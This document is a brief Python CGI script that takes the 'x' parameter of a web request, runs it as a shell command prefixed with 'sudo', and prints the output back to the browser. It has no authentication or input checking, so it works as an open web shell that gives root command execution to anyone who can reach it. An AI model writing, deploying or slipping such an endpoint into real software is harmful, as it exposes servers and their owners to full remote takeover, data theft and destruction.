#!/usr/bin/python3
import cgi
import subprocess

print("content-type:text/html")
print()

data = cgi.FieldStorage()
command = data.getvalue("x")
op = subprocess.getoutput("sudo " +command)

print(op)
